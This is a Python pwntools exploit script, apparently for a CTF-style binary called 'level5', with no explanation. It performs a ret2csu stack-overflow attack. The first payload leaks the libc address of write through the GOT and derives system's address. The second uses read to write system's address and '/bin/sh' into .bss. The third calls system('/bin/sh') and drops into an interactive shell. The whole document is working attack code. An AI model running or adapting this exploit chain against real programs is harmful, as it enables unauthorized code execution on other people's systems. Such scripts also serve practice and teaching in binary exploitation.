from pwn import *

elf = ELF('./level5')
io = process('./level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

first_address = 0x0000000000400606
second_address = 0x00000000004005F0
write_got = elf.got['write']
read_got = elf.got['read']
main_address = 0x0000000000400564
bss_address = 0x601028


payload1 = b'A'*128 + b'BBBBBBBB' + p64(first_address) + p64(0) + p64(0) + p64(1) + p64(write_got) + p64(1) +  p64(write_got) + p64(8) + p64(second_address) + b'A' * 56 + p64(main_address)

io.sendlineafter('\n',payload1)
sleep(1)

write_real_address = u64(io.recv(8))
system_real_address = write_real_address - (libc.symbols['write'] - libc.symbols['system'])

payload2 = cyclic(0x88) + p64(first_address) + p64(0) + p64(0) + p64(1) + p64(read_got) + p64(0) + p64(bss_address)
payload2 += p64(16) + p64(second_address) + cyclic(0x38) + p64(main_address)

io.sendlineafter('\n',payload2)
sleep(1)

io.send(p64(system_real_address))
io.send("/bin/sh\x00")

payload3 = cyclic(0x88) + p64(first_address) + p64(0) + p64(0) + p64(1) + p64(bss_address) + p64(bss_address + 8) + p64(0)
payload3 += p64(0) + p64(second_address) + b'\x00'*0x38 + p64(main_address)

io.sendlineafter('\n',payload3)
sleep(1)
io.interactive()
